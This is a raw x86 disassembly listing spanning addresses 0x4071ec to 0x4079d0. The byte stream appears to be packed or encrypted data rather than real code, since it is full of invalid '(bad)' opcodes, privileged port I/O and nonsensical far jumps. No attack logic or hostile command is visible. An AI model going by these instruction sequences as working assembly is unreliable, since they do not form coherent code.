  4071ec:	sar    ebx,0xe7
  4071ef:	pop    edi
  4071f0:	jmp    0xfcbe5145
  4071f5:	sbb    edx,esp
  4071f7:	push   ebp
  4071f8:	and    eax,edx
  4071fa:	cmp    al,0x61
  4071fc:	push   edx
  4071fd:	jl     0x4071bb
  4071ff:	jb     0x4071c8
  407201:	jmp    0x8382:0xd032d001
  407208:	test   DWORD PTR [esi+0x3a],eax
  40720b:	mov    eax,ss
  40720d:	jmp    0xba9:0xe0a24269
  407214:	lock mov ecx,edi
  407217:	jns    0x40728e
  407219:	mov    eax,ds:0x4c5b824c
  40721e:	(bad)  
  40721f:	fsubr  DWORD PTR cs:[edx]
  407222:	and    al,0x40
  407224:	test   eax,0xf630a600
  407229:	pop    es
  40722a:	or     bl,BYTE PTR [ecx*4+0x7453459d]
  407231:	retf   0xe38d
  407234:	(bad)  
  407235:	mov    bl,BYTE PTR [ebp+0xd635664]
  40723b:	and    DWORD PTR [ecx+0x5],ebp
  40723e:	mul    DWORD PTR [ebx-0x62]
  407241:	out    dx,al
  407242:	loopne 0x4071d4
  407244:	pop    edx
  407245:	imul   esp,ebx,0x1b81c28d
  40724b:	adc    al,0xb
  40724d:	int    0x7e
  40724f:	aad    0x9f
  407251:	adc    BYTE PTR [edx+0x73],ch
  407254:	push   ds
  407255:	or     dh,BYTE PTR [ecx]
  407257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407258:	adc    ecx,DWORD PTR [eax+0x77]
  40725b:	cmp    bl,ah
  40725d:	jp     0x40726c
  40725f:	btr    DWORD PTR [eax+0x5a44ff45],esi
  407266:	retf   
  407267:	(bad)  
  407268:	pop    es
  407269:	push   ebp
  40726a:	push   eax
  40726b:	xchg   ebp,eax
  40726c:	sbb    dl,BYTE PTR [eax+eiz*2-0x45]
  407270:	cmp    ebx,DWORD PTR [edi+ecx*8]
  407273:	or     eax,0xaf072ee0
  407278:	ins    BYTE PTR es:[edi],dx
  407279:	adc    eax,0xc95c398d
  40727e:	mov    ah,0x47
  407280:	mov    dh,0x15
  407282:	jmp    0x540b7f57
  407287:	call   DWORD PTR [ecx]
  407289:	not    dh
  40728b:	xor    DWORD PTR [edi-0x4a],edx
  40728e:	xor    BYTE PTR [ebx],dh
  407290:	and    dl,al
  407292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407293:	int3   
  407294:	retf   0x89a7
  407297:	loopne 0x407220
  407299:	push   ebx
  40729a:	or     ebp,DWORD PTR [ecx]
  40729c:	ja     0x40724b
  40729e:	and    BYTE PTR [ebp-0x37],bh
  4072a1:	out    0x89,al
  4072a3:	out    0x51,eax
  4072a5:	jge    0x407257
  4072a7:	and    al,0x11
  4072a9:	in     al,dx
  4072aa:	sbb    ecx,DWORD PTR [ecx]
  4072ac:	sbb    BYTE PTR [ecx+0x3df42e04],bl
  4072b2:	cli    
  4072b3:	fisttp QWORD PTR [edx-0x7c4b9515]
  4072b9:	mov    bh,BYTE PTR [esi]
  4072bb:	int    0xaf
  4072bd:	push   eax
  4072be:	and    bl,dh
  4072c0:	call   0xd8bc830
  4072c5:	jge    0x4072ff
  4072c7:	dec    esp
  4072c8:	int    0x95
  4072ca:	xchg   ebp,edi
  4072cc:	xchg   ebx,eax
  4072cd:	imul   esp,edx,0xffffff8d
  4072d0:	adc    al,0xd7
  4072d2:	ficom  DWORD PTR [ebp+0x4c51b979]
  4072d8:	loop   0x407333
  4072da:	pop    ss
  4072db:	xor    BYTE PTR ds:0x8554ec72,cl
  4072e1:	(bad)  
  4072e2:	ficomp WORD PTR [ecx+0x310f285d]
  4072e8:	cmp    BYTE PTR es:[ebx+0x2a],bh
  4072ec:	fistp  QWORD PTR [ebp+ebp*8+0x4582ee54]
  4072f3:	mov    BYTE PTR ds:0xd1d6b70e,0xed
  4072fa:	push   cs
  4072fb:	inc    ebx
  4072fc:	mov    DWORD PTR [edx],0xf1c55a5f
  407302:	and    DWORD PTR [edi-0x32],edx
  407305:	stos   BYTE PTR es:[edi],al
  407306:	repnz or al,0xd9
  407309:	imul   sp,WORD PTR [edi],0x38
  40730d:	push   es
  40730e:	xchg   ebx,eax
  40730f:	cmp    esp,eax
  407311:	inc    esp
  407312:	sub    ebx,DWORD PTR [edi-0x14f47447]
  407318:	jns    0x4072e2
  40731a:	das    
  40731b:	push   ebx
  40731c:	or     eax,0xdf609ea6
  407321:	adc    BYTE PTR [eax+edi*4+0x386f4c66],bl
  407328:	repnz clc 
  40732a:	jl     0x407324
  40732c:	xor    edi,DWORD PTR [ecx+ebx*4]
  40732f:	cmp    BYTE PTR [eax+0x2a309455],dh
  407335:	ds mov cl,0x32
  407338:	cmp    al,0x7c
  40733a:	jo     0x4072d1
  40733c:	xchg   esp,eax
  40733d:	xchg   edi,eax
  40733e:	(bad)  
  40733f:	div    BYTE PTR [ecx+0x2bd9e771]
  407345:	out    dx,eax
  407346:	mov    eax,ds:0x6962573d
  40734b:	push   esp
  40734c:	dec    edx
  40734d:	dec    eax
  40734e:	ds repz inc ebp
  407351:	aad    0xc2
  407353:	cmp    eax,0x3063c8f0
  407358:	push   ds
  407359:	inc    edi
  40735a:	aad    0xb2
  40735c:	mov    ch,0xa8
  40735e:	or     BYTE PTR [esi-0x20],bl
  407361:	push   ebp
  407362:	mov    ah,0x15
  407364:	xchg   ebp,eax
  407365:	shr    ah,1
  407367:	cmp    eax,0x3944f751
  40736c:	ja     0x4073d4
  40736e:	test   dh,cl
  407370:	mov    cl,0x60
  407372:	cmc    
  407373:	test   eax,0xd656f7c6
  407378:	addr16 jl 0x407379
  40737b:	bound  esp,QWORD PTR [eax+0x53c8c2d5]
  407381:	pop    ds
  407382:	pop    esp
  407383:	mov    edi,edx
  407385:	or     eax,0x2c52c3af
  40738a:	loopne 0x4073fe
  40738c:	mov    dh,0xbe
  40738e:	inc    edx
  40738f:	les    esp,FWORD PTR [ecx+0x4c]
  407392:	stos   BYTE PTR es:[edi],al
  407393:	inc    eax
  407394:	cmp    BYTE PTR [edi],dl
  407396:	arpl   WORD PTR [esi+0x2a],si
  407399:	mov    eax,ds:0x5c5c5856
  40739e:	test   eax,0x939a49f4
  4073a3:	xor    al,0x3c
  4073a5:	xchg   DWORD PTR [eax-0x64],edx
  4073a8:	cmp    eax,0xd0aacc97
  4073ad:	test   DWORD PTR [ecx+0x2972bfac],0xd57ff8f
  4073b7:	into   
  4073b8:	sar    DWORD PTR [esi],0x8f
  4073bb:	fs or  eax,0x3fc24b86
  4073c1:	lods   al,BYTE PTR ds:[esi]
  4073c2:	hlt    
  4073c3:	retf   
  4073c4:	mov    WORD PTR [eax+ecx*2],cs
  4073c7:	and    edi,DWORD PTR [ebx+0x4fcd3ea8]
  4073cd:	fincstp 
  4073cf:	cmp    eax,DWORD PTR [ebx-0x1b1538b]
  4073d5:	cmp    edi,DWORD PTR fs:[eax-0x30]
  4073d9:	jno    0x40738a
  4073db:	fst    QWORD PTR [ebp-0x19]
  4073de:	pop    esi
  4073df:	cmp    al,0xe3
  4073e1:	pop    edx
  4073e2:	mov    esi,0x568d184f
  4073e7:	jecxz  0x40744c
  4073e9:	repnz ss lahf 
  4073ec:	lods   al,BYTE PTR ds:[esi]
  4073ed:	push   ecx
  4073ee:	pop    ebx
  4073ef:	dec    ebx
  4073f0:	inc    esi
  4073f1:	mov    edi,0x5bbea623
  4073f6:	adc    edx,ecx
  4073f8:	or     DWORD PTR [ebp+0x57c58d51],edi
  4073fe:	jns    0x407420
  407400:	jge    0x407391
  407402:	and    eax,0xddfd5613
  407407:	call   0x8063dc9d
  40740c:	mov    dl,0x36
  40740e:	push   edi
  40740f:	adc    al,0x6b
  407411:	adc    al,0xbe
  407413:	adc    dl,bl
  407415:	jbe    0x40739b
  407417:	pop    ecx
  407418:	cwde   
  407419:	add    DWORD PTR [edx],esp
  40741b:	add    eax,0x448ab9a6
  407420:	dec    ebp
  407421:	push   edi
  407422:	sub    BYTE PTR [ecx],0x9e
  407425:	into   
  407426:	pop    edi
  407427:	(bad)
  40742a:	mov    ds:0x2a562254,eax
  40742f:	in     eax,dx
  407430:	inc    esi
  407431:	mov    ah,0xe3
  407433:	(bad)  
  407434:	or     edi,esi
  407436:	pop    es
  407437:	jmp    0x4074a0
  407439:	sahf   
  40743a:	(bad)  
  40743b:	bound  ecx,QWORD PTR [ebx+edx*4]
  40743e:	js     0x4074b7
  407440:	sub    edi,ecx
  407442:	mov    eax,ds:0x2ab656ec
  407447:	int3   
  407448:	xor    DWORD PTR [esi-0x7b],ecx
  40744b:	fistp  QWORD PTR ds:0x73d96e6e
  407451:	gs or  eax,0x1e7b18b2
  407457:	and    ebp,DWORD PTR [esi]
  407459:	push   ss
  40745a:	repnz cs loopne 0x4073e6
  40745e:	jb     0x407450
  407460:	out    0x81,eax
  407462:	cli    
  407463:	mov    ah,0xc5
  407465:	jmp    0xb57937f9
  40746a:	dec    esi
  40746b:	add    BYTE PTR [edx],0x4d
  40746e:	add    BYTE PTR [ebx+0x4877de4a],ch
  407474:	jge    0x4074b8
  407476:	test   BYTE PTR [ebp+eiz*4-0x53],dh
  40747a:	push   ds
  40747b:	and    ebx,DWORD PTR [esi+0xb756cf9]
  407481:	and    bh,BYTE PTR [ebx+0x972b635]
  407487:	lahf   
  407488:	cmp    eax,0x84db19f4
  40748d:	pop    es
  40748e:	mov    al,0x16
  407490:	leave  
  407491:	push   esp
  407492:	hlt    
  407493:	sbb    DWORD PTR [edx],esi
  407495:	ret    0x7d3d
  407498:	mov    ds:0xae3ccb67,al
  40749d:	sub    eax,0x16f2dbff
  4074a2:	rcl    bh,cl
  4074a4:	pop    ebp
  4074a5:	clc    
  4074a6:	frstor ds:[edx]
  4074a9:	inc    ecx
  4074aa:	fstp   TBYTE PTR [esi]
  4074ac:	or     bh,bl
  4074ae:	fiadd  WORD PTR [edi-0x75]
  4074b1:	imul   edx,DWORD PTR [ecx],0x46
  4074b4:	dec    ebp
  4074b5:	xchg   esi,eax
  4074b6:	call   0x250a4131
  4074bb:	add    al,0xef
  4074bd:	sbb    eax,0x39d45d12
  4074c2:	int3   
  4074c3:	out    dx,al
  4074c4:	lock frstor [ebx+0x158a620d]
  4074cb:	stc    
  4074cc:	sub    edi,edi
  4074ce:	mov    dl,0x21
  4074d0:	mov    edx,0x7906697e
  4074d5:	dec    ebx
  4074d6:	mov    ds:0x2062b043,al
  4074db:	xchg   esi,eax
  4074dc:	into   
  4074dd:	and    BYTE PTR [edi+0x8931414],ah
  4074e3:	adc    DWORD PTR [eax-0x30ffa0d3],esp
  4074e9:	dec    DWORD PTR [edx+0x2d]
  4074ec:	std    
  4074ed:	jl     0x407567
  4074ef:	dec    esp
  4074f0:	gs cmp ch,bh
  4074f3:	lods   al,BYTE PTR ds:[esi]
  4074f4:	dec    ecx
  4074f5:	scas   eax,DWORD PTR es:[edi]
  4074f6:	sub    al,0x93
  4074f8:	imul   ecx,DWORD PTR [edi],0x7e
  4074fb:	jl     0x4074a2
  4074fd:	mov    al,ds:0xd746bbc1
  407502:	or     al,0x5e
  407504:	stos   BYTE PTR es:[edi],al
  407505:	lahf   
  407506:	sbb    DWORD PTR [eax],0xffffffde
  407509:	xor    ch,ch
  40750b:	(bad)  
  40750c:	mov    ch,0x91
  40750e:	sub    DWORD PTR [edi+0x5893662b],esi
  407514:	repnz cli 
  407516:	mov    al,ds:0x70eb1627
  40751b:	sbb    ecx,DWORD PTR [ebx-0x10]
  40751e:	out    0x94,al
  407520:	sbb    ch,BYTE PTR [edi+0xf]
  407523:	je     0x4074c4
  407525:	jnp    0x4074e7
  407527:	scas   eax,DWORD PTR es:[edi]
  407528:	cmp    eax,0xfec8613e
  40752d:	lock fnsave [edi+0x5130a917]
  407534:	scas   al,BYTE PTR es:[edi]
  407535:	mov    esp,0x61e755db
  40753a:	scas   eax,DWORD PTR es:[edi]
  40753b:	mov    ch,0xfc
  40753d:	fsubp  st(7),st
  40753f:	push   cs
  407540:	sbb    ah,al
  407542:	int    0x2a
  407544:	dec    ecx
  407545:	and    BYTE PTR ds:0x4d8dd866,cl
  40754b:	xor    DWORD PTR [ecx+0x36],ebx
  40754e:	xor    BYTE PTR [edi+eiz*8],cl
  407551:	jb     0x407565
  407553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407554:	unpckhps xmm2,XMMWORD PTR [ebp-0x60]
  407558:	sub    ah,BYTE PTR [edi-0x7d]
  40755b:	jmp    0x4339c238
  407560:	cmc    
  407561:	push   es
  407562:	push   ds
  407563:	push   0xf416a68f
  407568:	rcl    DWORD PTR [edx+0x6639da4],1
  40756e:	inc    esi
  40756f:	jae    0x407583
  407571:	jnp    0x4075e9
  407573:	push   esp
  407574:	std    
  407575:	dec    ecx
  407576:	xchg   ecx,eax
  407577:	ins    DWORD PTR es:[edi],dx
  407578:	enter  0x2695,0x3e
  40757c:	aam    0xec
  40757e:	cdq    
  40757f:	xchg   edx,eax
  407580:	repz xchg ebx,eax
  407583:	rol    BYTE PTR [edi],0xd4
  407586:	xor    al,0xe4
  407588:	or     DWORD PTR [eax+0x76afb430],esp
  40758e:	cmp    DWORD PTR [ebx],ecx
  407590:	jg     0x4075db
  407592:	sub    eax,0x1a963ed3
  407597:	fwait
  407598:	jns    0x40756d
  40759a:	mov    BYTE PTR [edi+0x7e],dh
  40759d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40759e:	scas   eax,DWORD PTR es:[edi]
  40759f:	dec    esi
  4075a0:	jl     0x407592
  4075a2:	jmp    0xc6b6:0x348dfa23
  4075a9:	ins    DWORD PTR es:[edi],dx
  4075aa:	test   eax,0x1f05537d
  4075af:	sbb    al,0xce
  4075b1:	stos   DWORD PTR es:[edi],eax
  4075b2:	adc    al,0xb
  4075b4:	xchg   ecx,eax
  4075b5:	dec    esi
  4075b6:	inc    ecx
  4075b7:	ret    0xcfe1
  4075ba:	xchg   edi,eax
  4075bb:	pushf  
  4075bc:	sbb    BYTE PTR [ecx],dl
  4075be:	push   di
  4075c0:	jb     0x40759c
  4075c2:	ss push ecx
  4075c4:	pop    esi
  4075c5:	lods   eax,DWORD PTR ds:[esi]
  4075c6:	imul   BYTE PTR [edi+0x4b8269e2]
  4075cc:	mov    esp,0x1c34c0fe
  4075d1:	call   0x74fccca0
  4075d6:	clc    
  4075d7:	arpl   WORD PTR [ebx],di
  4075d9:	loopne 0x40763b
  4075db:	push   edi
  4075dc:	add    dl,BYTE PTR [ecx]
  4075de:	push   ebx
  4075df:	jb     0x40764c
  4075e1:	loop   0x407578
  4075e3:	into   
  4075e4:	clc    
  4075e5:	dec    edi
  4075e6:	mov    esp,0xa16c5a5f
  4075eb:	pusha  
  4075ec:	test   al,0x7b
  4075ee:	xchg   DWORD PTR [edx+0x238a2038],ebp
  4075f4:	push   ss
  4075f5:	out    dx,eax
  4075f6:	push   eax
  4075f7:	adc    BYTE PTR [ecx],cl
  4075f9:	call   0x46d9112
  4075fe:	lahf   
  4075ff:	popa   
  407600:	fisubr WORD PTR [ebx+0x5df1b15d]
  407606:	cmp    DWORD PTR [ecx-0x33],esi
  407609:	jns    0x407625
  40760b:	pop    edx
  40760c:	xchg   esi,eax
  40760d:	cli    
  40760e:	neg    DWORD PTR [ebx]
  407610:	out    dx,eax
  407611:	sbb    eax,0x3156959
  407616:	xor    ebx,DWORD PTR [ebp-0x61]
  407619:	add    ebp,DWORD PTR [edx+0x61944f4d]
  40761f:	add    BYTE PTR [esi+0x35f29c17],bh
  407625:	pushf  
  407626:	pop    eax
  407627:	mov    dl,cl
  407629:	jg     0x407630
  40762b:	jmp    0x4075d2
  40762d:	mov    al,ds:0x8c523a7b
  407632:	pop    eax
  407633:	call   0x7565:0xafd1e2db
  40763a:	fdivr  DWORD PTR [edx]
  40763c:	cmp    edi,DWORD PTR [ebp-0x2b]
  40763f:	inc    ecx
  407640:	mov    bh,0x68
  407642:	push   ds
  407643:	pop    ss
  407644:	rcl    DWORD PTR [esi+ebx*2],cl
  407647:	ins    DWORD PTR es:[edi],dx
  407648:	(bad)  [ebp+0x0]
  40764b:	call   0xbbd5:0xbb21bfa2
  407652:	cdq    
  407653:	and    BYTE PTR [eax],0x38
  407656:	push   ss
  407657:	je     0x407673
  407659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40765a:	sub    BYTE PTR [ecx-0x4cb86fd8],0xfc
  407661:	xor    eax,0xb79ad560
  407666:	call   0x2ec35944
  40766b:	shl    BYTE PTR [eax-0x3f01d367],cl
  407671:	sub    bl,BYTE PTR [edx-0xaf59d85]
  407677:	dec    ecx
  407678:	sbb    DWORD PTR [edi+0x2b9fc2df],edx
  40767e:	out    dx,eax
  40767f:	les    esp,FWORD PTR [edx]
  407681:	pop    ecx
  407682:	jnp    0x4076d1
  407684:	inc    edx
  407685:	sub    cl,BYTE PTR [esi+0x7d]
  407688:	inc    ebp
  407689:	pop    eax
  40768a:	test   BYTE PTR [edi],bh
  40768c:	mov    ecx,0xb86f5206
  407691:	jo     0x4076e3
  407693:	loope  0x407635
  407695:	sahf   
  407696:	nop
  407697:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407698:	sti    
  407699:	lods   eax,DWORD PTR ds:[esi]
  40769a:	fmul   DWORD PTR [ebp+0x3f5735a3]
  4076a0:	mov    dl,0xf1
  4076a2:	cmp    DWORD PTR ss:[ebp-0x19],ecx
  4076a6:	clc    
  4076a7:	fwait
  4076a8:	ins    BYTE PTR es:[edi],dx
  4076a9:	outs   dx,DWORD PTR ds:[esi]
  4076aa:	(bad)  
  4076ab:	ret    0xd75b
  4076ae:	js     0x407698
  4076b0:	test   BYTE PTR [ebx+0x53351d2],al
  4076b6:	shl    DWORD PTR [esi-0x15],cl
  4076b9:	arpl   ax,di
  4076bb:	aad    0x83
  4076bd:	pop    ebx
  4076be:	mov    esp,0x1522866d
  4076c3:	cld    
  4076c4:	jne    0x407726
  4076c6:	pop    esp
  4076c7:	in     eax,0xff
  4076c9:	sub    al,ah
  4076cb:	push   0x2b2ea9ef
  4076d0:	inc    edi
  4076d1:	pop    ss
  4076d2:	repz push esi
  4076d4:	nop
  4076d5:	sti    
  4076d6:	les    ebp,FWORD PTR [edi]
  4076d8:	mul    BYTE PTR [eax+0x27]
  4076db:	lods   eax,DWORD PTR ds:[esi]
  4076dc:	retf   
  4076dd:	mov    ds:0xc7c68174,eax
  4076e2:	(bad)  
  4076e3:	jo     0x407691
  4076e5:	(bad)  
  4076e6:	mov    dh,0x8b
  4076e8:	push   edi
  4076e9:	add    dl,BYTE PTR [esi-0x67216396]
  4076ef:	push   0xffffffcf
  4076f1:	or     cl,ch
  4076f3:	adc    cl,BYTE PTR [ebx]
  4076f5:	sbb    al,0x98
  4076f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076f8:	repnz or BYTE PTR [edx-0x1c901e32],0xb1
  407700:	mov    cl,0x46
  407702:	inc    esp
  407703:	addr16 jl 0x4076bd
  407706:	out    0x2b,al
  407708:	std    
  407709:	inc    edi
  40770a:	jge    0x4076c5
  40770c:	loopne 0x4076ef
  40770e:	cs loope 0x4076f6
  407711:	pop    ebp
  407712:	sub    eax,0x19602e18
  407717:	enter  0xb41,0xc6
  40771b:	mov    al,0x4f
  40771d:	jne    0x407745
  40771f:	in     eax,dx
  407720:	xor    al,0xfc
  407722:	sub    bh,BYTE PTR [esi+0x21]
  407725:	pop    ecx
  407726:	xlat   BYTE PTR ds:[ebx]
  407727:	mov    DWORD PTR [ecx+0xc368d94],esi
  40772d:	cmp    al,0x91
  40772f:	sub    ah,BYTE PTR [edx-0x1bbb85cf]
  407735:	xor    bh,BYTE PTR [edx+0x56d2c5e6]
  40773b:	scas   eax,DWORD PTR es:[edi]
  40773c:	div    DWORD PTR [ecx-0x21d513c9]
  407742:	mov    al,ds:0x1f78d9ee
  407747:	clc    
  407748:	mov    ds:0x4d9726e4,al
  40774d:	xchg   DWORD PTR [ebx+0xa],esi
  407750:	outs   dx,BYTE PTR ds:[esi]
  407751:	je     0x407790
  407753:	popa   
  407754:	inc    ebx
  407755:	repnz hlt 
  407757:	shl    BYTE PTR [edi],0x29
  40775a:	and    DWORD PTR [edx],edi
  40775c:	push   ds
  40775d:	jmp    0x3361:0x3e29f5aa
  407764:	xchg   BYTE PTR [eax-0x22],ah
  407767:	xchg   edx,eax
  407768:	mov    al,es:0x93ec1917
  40776e:	retf   
  40776f:	and    eax,0xaf1516c1
  407774:	xchg   edx,eax
  407775:	cld    
  407776:	or     BYTE PTR [esi-0x6f],dh
  407779:	test   al,dh
  40777b:	xor    DWORD PTR [ecx],eax
  40777d:	iret   
  40777e:	popf   
  40777f:	rcl    BYTE PTR [ebp+0x20],0x64
  407783:	pushf  
  407784:	into   
  407785:	mov    esp,0xd05c8bd6
  40778a:	cli    
  40778b:	or     al,BYTE PTR [ecx-0x47]
  40778e:	adc    ch,BYTE PTR [ecx]
  407790:	call   0xb897d48b
  407795:	out    0x82,al
  407797:	icebp  
  407798:	jnp    0x407740
  40779a:	sub    eax,0xae3d8e5c
  40779f:	loop   0x40775b
  4077a1:	into   
  4077a2:	jns    0x407743
  4077a4:	imul   ebp,ebp,0xffffffa0
  4077a7:	loope  0x4077c5
  4077a9:	sub    bl,BYTE PTR [ecx-0x77]
  4077ac:	test   eax,0xb8253bef
  4077b1:	clc    
  4077b2:	call   0xcda0a6d8
  4077b7:	aam    0xa2
  4077b9:	std    
  4077ba:	mov    ds:0x3a87a24,eax
  4077bf:	sub    eax,0xf0ef358d
  4077c4:	dec    esi
  4077c5:	cdq    
  4077c6:	sub    edi,DWORD PTR [ebp-0x67]
  4077c9:	aam    0xe6
  4077cb:	mov    BYTE PTR [edi+0x3f],ch
  4077ce:	imul   ebx,DWORD PTR gs:[esi],0x327954a1
  4077d5:	mov    dh,0xc7
  4077d7:	not    edi
  4077d9:	mov    al,0x50
  4077db:	xchg   edi,eax
  4077dc:	leave  
  4077dd:	jecxz  0x40776b
  4077df:	sti    
  4077e0:	xchg   ebx,eax
  4077e1:	out    dx,eax
  4077e2:	add    al,0xe
  4077e4:	jne    0x4077c1
  4077e6:	scas   eax,DWORD PTR es:[edi]
  4077e7:	mov    esi,0x84c7b359
  4077ec:	rcl    DWORD PTR [ebx-0x40],0x40
  4077f0:	jno    0x407838
  4077f2:	push   ecx
  4077f3:	or     al,BYTE PTR [edx+0x6e]
  4077f6:	jecxz  0x407815
  4077f8:	retf   
  4077f9:	in     eax,0x91
  4077fb:	sub    BYTE PTR [edx+0x5e504426],bh
  407801:	hlt    
  407802:	ret    0x16ce
  407805:	add    DWORD PTR [esi-0x76],ebx
  407808:	arpl   bx,bp
  40780a:	(bad)  
  40780b:	jmp    0x407813
  40780d:	push   edi
  40780e:	jae    0x40785e
  407810:	or     al,0xba
  407812:	push   eax
  407813:	xor    bh,BYTE PTR [esi-0x61ace9f8]
  407819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40781a:	sub    al,dl
  40781c:	repnz out 0x3c,eax
  40781f:	pop    ss
  407820:	jmp    0x8506a793
  407825:	inc    esp
  407826:	ss je  0x4077b3
  407829:	sbb    DWORD PTR [ebx-0x6f],esp
  40782c:	int3   
  40782d:	bound  ebx,QWORD PTR [ecx]
  40782f:	cli    
  407830:	jo     0x407839
  407832:	cld    
  407833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407834:	test   ch,ah
  407836:	pop    ecx
  407837:	retf   
  407838:	mov    eax,0x9c79e6e
  40783d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40783e:	stc    
  40783f:	fs (bad) 
  407841:	mov    ch,dh
  407843:	dec    esi
  407844:	push   ds
  407845:	int3   
  407846:	mov    DWORD PTR [eax+0x71b53ec3],edx
  40784c:	pop    ebp
  40784d:	stos   BYTE PTR es:[edi],al
  40784e:	fcomp  QWORD PTR [ebx+0x794ec2ab]
  407854:	pushf  
  407855:	sbb    al,dl
  407857:	mov    ebx,0xd26dab02
  40785c:	sbb    al,0x68
  40785e:	and    eax,0x43ce181a
  407863:	daa    
  407864:	jnp    0x40782f
  407866:	int    0x8
  407868:	leave  
  407869:	jb     0x40786f
  40786b:	fist   DWORD PTR [esi]
  40786d:	test   DWORD PTR ds:0x7d30b2db,edi
  407873:	in     eax,0xa1
  407875:	xor    al,0x83
  407877:	jmp    0x407891
  407879:	data16 jno 0x407872
  40787c:	push   ds
  40787d:	(bad)  
  40787e:	pop    ss
  40787f:	mov    edi,0x90e51540
  407884:	inc    eax
  407885:	popa   
  407886:	pop    ebx
  407887:	jb     0x4078d1
  407889:	je     0x407846
  40788b:	mov    ebp,0x682347ca
  407890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407891:	sar    DWORD PTR [ebx-0x44],cl
  407894:	lahf   
  407895:	in     al,dx
  407896:	fs ins BYTE PTR es:[edi],dx
  407898:	mov    edx,0x8663e12a
  40789d:	mov    DWORD PTR [edx-0xf9cabbd],edi
  4078a3:	rcr    dl,0xbe
  4078a6:	test   DWORD PTR [ebx-0xb14301a],esp
  4078ac:	mov    ch,0x2c
  4078ae:	mov    edx,0xe6be4209
  4078b3:	jecxz  0x407919
  4078b5:	mov    DWORD PTR [edi-0x22b1144a],edx
  4078bb:	bound  ebx,QWORD PTR [edi*2-0x37f5e9b6]
  4078c2:	cmp    al,0xe3
  4078c4:	mov    dh,0x42
  4078c6:	inc    ecx
  4078c7:	cwde   
  4078c8:	aam    0xf7
  4078ca:	jno    0x4078c8
  4078cc:	push   0x2a
  4078ce:	retf   0x78b7
  4078d1:	or     dh,BYTE PTR [esi]
  4078d3:	pop    ss
  4078d4:	xlat   BYTE PTR ds:[ebx]
  4078d5:	iret   
  4078d6:	fild   DWORD PTR [ebp-0x6e]
  4078d9:	stc    
  4078da:	inc    eax
  4078db:	into   
  4078dc:	jae    0x407926
  4078de:	mov    DWORD PTR [esi],ecx
  4078e0:	xchg   DWORD PTR [ebx+eax*4],eax
  4078e3:	repz mov ds:0xd8d013fb,eax
  4078e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078ea:	jb     0x4078ad
  4078ec:	mov    eax,ds:0xa09fe2cb
  4078f1:	ret    
  4078f2:	lahf   
  4078f3:	dec    esi
  4078f4:	mul    DWORD PTR [ebp-0x4a91f98]
  4078fa:	adc    ah,ch
  4078fc:	dec    eax
  4078fd:	into   
  4078fe:	mul    ecx
  407900:	ins    DWORD PTR es:[edi],dx
  407901:	test   ebx,esi
  407903:	enter  0xae11,0xd7
  407907:	sbb    al,0x92
  407909:	add    esi,edi
  40790b:	in     al,dx
  40790c:	adc    eax,esi
  40790e:	jge    0x4078cc
  407910:	push   ecx
  407911:	inc    esi
  407912:	fwait
  407913:	int3   
  407914:	push   esp
  407915:	xlat   BYTE PTR ds:[ebx]
  407916:	nop
  407917:	push   cs
  407918:	dec    esp
  407919:	arpl   di,dx
  40791b:	icebp  
  40791c:	jl     0x4078ed
  40791e:	cld    
  40791f:	aad    0xeb
  407921:	adc    ch,BYTE PTR [esi+0x71]
  407924:	cwde   
  407925:	or     BYTE PTR [esp+edx*8+0x597119c7],0x2c
  40792d:	loop   0x407941
  40792f:	xchg   ebp,eax
  407930:	mov    eax,0x9387fa72
  407935:	in     eax,dx
  407936:	sar    edx,1
  407938:	ja     0x40795b
  40793a:	dec    edx
  40793b:	and    DWORD PTR [ebp+0x56],esp
  40793e:	out    0xc2,al
  407940:	out    dx,al
  407941:	addr16 xor eax,0xd6efabac
  407947:	in     al,0xb7
  407949:	inc    edx
  40794a:	popa   
  40794b:	cld    
  40794c:	js     0x4079cd
  40794e:	xchg   DWORD PTR [esi],eax
  407950:	and    ebx,DWORD PTR [ebp+0x62]
  407953:	mov    esp,0x36ce7897
  407958:	mov    edx,0x4dd23760
  40795d:	mov    bh,0xbb
  40795f:	or     eax,DWORD PTR [edx]
  407961:	outs   dx,DWORD PTR ds:[esi]
  407962:	sub    DWORD PTR [ebx-0x22],esi
  407965:	xchg   ecx,eax
  407966:	fimul  DWORD PTR [esi-0x5a]
  407969:	fnstenv [edx+ebx*8-0x3d]
  40796d:	jb     0x407935
  40796f:	hlt    
  407970:	out    0x40,eax
  407972:	push   ebp
  407973:	or     DWORD PTR [ebx+esi*1],eax
  407976:	fcom   QWORD PTR [eax]
  407978:	std    
  407979:	jo     0x4079d5
  40797b:	ds xor al,0xad
  40797e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40797f:	add    ecx,DWORD PTR [esi-0x438aa6f]
  407985:	jge    0x407968
  407987:	adc    eax,0x751fe371
  40798c:	xor    al,ch
  40798e:	dec    ebx
  40798f:	lods   al,BYTE PTR es:[esi]
  407991:	sub    BYTE PTR [ebp-0x3f],dl
  407994:	retf   
  407995:	push   esp
  407996:	stc    
  407997:	cmp    bl,BYTE PTR [ebx-0x22]
  40799a:	pusha  
  40799b:	and    eax,0xf2e3737f
  4079a0:	push   es
  4079a1:	mov    esi,0x53acb105
  4079a6:	xor    al,0xf9
  4079a8:	stos   BYTE PTR es:[edi],al
  4079a9:	mov    esp,0x153d53e9
  4079ae:	fistp  WORD PTR [edx-0x75]
  4079b1:	jno    0x407987
  4079b3:	mov    esp,0xc060998b
  4079b8:	fisubr WORD PTR ds:0x7751489e
  4079be:	pop    edx
  4079bf:	lods   al,BYTE PTR ds:[esi]
  4079c0:	pushf  
  4079c1:	mov    ah,0x3e
  4079c3:	iret   
  4079c4:	retf   
  4079c5:	mov    ebx,0xf3e5002b
  4079ca:	or     al,0xf3
  4079cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079cd:	inc    esi
  4079ce:	xchg   esp,ebp
  4079d0:	push   edx
